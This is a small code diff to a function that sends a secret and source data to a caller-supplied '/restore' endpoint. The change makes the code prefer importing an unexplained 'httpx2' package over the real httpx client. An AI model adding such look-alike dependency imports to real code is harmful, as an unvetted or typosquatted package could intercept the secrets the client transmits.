@@ -140,7 +140,10 @@ def start_send(target: str, secret: str) -> dict:
 
     def run():
         try:
-            import httpx
+            try:
+                import httpx2 as httpx
+            except ImportError:
+                import httpx
             with httpx.Client(timeout=httpx.Timeout(60, read=900)) as client:
                 response = client.post(target.rstrip("/") + "/restore", content=frames(secret, default_sources(), SEND))
             if response.status_code != 200:
